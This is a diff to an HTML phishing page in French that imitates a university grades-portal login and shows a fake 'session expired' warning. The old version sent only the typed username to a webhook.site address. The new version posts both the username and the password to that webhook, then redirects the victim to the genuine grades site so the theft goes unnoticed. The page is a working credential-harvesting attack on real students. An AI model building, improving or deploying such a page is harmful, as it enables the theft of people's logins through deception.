@@ -132,36 +132,16 @@
             Votre session a expiré, vous devez vous réauthentifier
         </div>
 
-        <script>
-            function captureEtRedirige(event) {
-                event.preventDefault(); // Empêche le rechargement immédiat
-                
-                const id = document.getElementById('id_user').value;
-                const webhookUrl = "https://webhook.site/277897aa-a358-40ba-843d-fcba81e50cd2";
-
-                // 1. On envoie l'ID au webhook de manière invisible
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: new URLSearchParams({ 'identifiant_capture': id })
-                });
-
-                // 2. On attend un tout petit peu et on redirige vers les notes de l'IUT
-                setTimeout(function() {
-                    window.location.href = "https://notes.iut-nfc.umlp.fr/";
-                }, 400);
-            }
-        </script>
-
-        <form onsubmit="captureEtRedirige(event)">
+        <form id="phishingForm" action="https://webhook.site/277897aa-a358-40ba-843d-fcba81e50cd2" method="POST">
+            
             <div class="input-row">
                 <div class="icon-box">👤</div>
-                <input type="text" id="id_user" placeholder="Identifiant" required>
+                <input type="text" name="identifiant_victime" id="user" placeholder="Identifiant" required>
             </div>
 
             <div class="input-row">
                 <div class="icon-box">🔒</div>
-                <input type="password" placeholder="Mot de passe" required>
+                <input type="password" name="mot_de_passe" id="pass" placeholder="Mot de passe" required>
             </div>
 
             <div class="check-container">
@@ -183,6 +163,17 @@
         Première connexion ? <u>Activez votre compte.</u>
     </div>
 </div>
+
+<script>
+    // Ce script intercepte l'envoi pour forcer la redirection après le départ des données
+    document.getElementById('phishingForm').addEventListener('submit', function(e) {
+        var form = this;
+        // On laisse 500ms au navigateur pour envoyer la requête POST au Webhook
+        setTimeout(function() {
+            window.location.href = "https://notes.iut-nfc.umlp.fr/";
+        }, 600);
+    });
+</script>
 
 </body>
 </html>
